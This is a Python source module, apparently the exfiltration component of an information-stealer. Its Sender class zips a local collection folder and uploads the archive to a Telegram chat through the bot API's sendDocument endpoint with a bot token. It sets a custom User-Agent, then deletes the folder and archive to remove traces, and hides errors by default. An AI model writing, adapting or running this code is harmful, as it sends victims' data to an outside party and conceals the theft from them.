from os import remove
from shutil import make_archive, rmtree
from urllib.request import Request, urlopen

from ..utils.config import SenderConfig
from ..utils.multipart import MultipartFormDataEncoder


class Sender:

    def __init__(self, *args):

        self.config = SenderConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_archive(self):

        make_archive(rf"{self.storage_path}\{self.zip_name}", "zip", rf"{self.storage_path}\{self.storage_folder}")

    def __send_archive(self):

        with open(rf"{self.storage_path}\{self.zip_name}.zip", "rb") as file:

            content_type, body = MultipartFormDataEncoder().encode(
                [("chat_id", self.user_id)],
                [("document", f"{self.zip_name}.zip", file)]
            )

            query = Request(
                method="POST",
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data=body
            )

            query.add_header("User-Agent", self.config.UserAgent)
            query.add_header("Content-Type", content_type)

            urlopen(query)

        file.close()

    def __delete_files(self):

        rmtree(rf"{self.storage_path}\{self.storage_folder}")
        remove(rf"{self.storage_path}\{self.zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:
            if self.errors is True: print(f"[SENDER]: {repr(e)}")
